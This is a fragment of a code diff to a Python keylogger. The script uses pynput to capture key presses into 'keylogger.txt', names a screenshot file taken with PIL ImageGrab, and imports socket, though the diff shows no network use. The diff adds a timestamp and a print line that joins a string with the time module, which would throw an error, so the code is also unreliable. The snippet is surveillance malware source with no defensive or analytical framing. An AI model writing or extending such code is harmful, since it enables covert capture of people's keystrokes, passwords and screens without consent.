@@ -1,12 +1,14 @@
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
 import socket
+import time
 
 filepath = 'choose/path/to/your/file'
 keylog = 'keylogger.txt'
 scrshot = 'screenshot.png'
 count = 0
 keys = []
+currenttime = time.time()
 def on_press(key) :
     global keys, count
     print(key)
@@ -19,6 +21,7 @@ def on_press(key) :
 
 def on_release(key) :
     if key == Key.esc :
+        print('\n' + time )
         return False
 
 def writefile(keys):
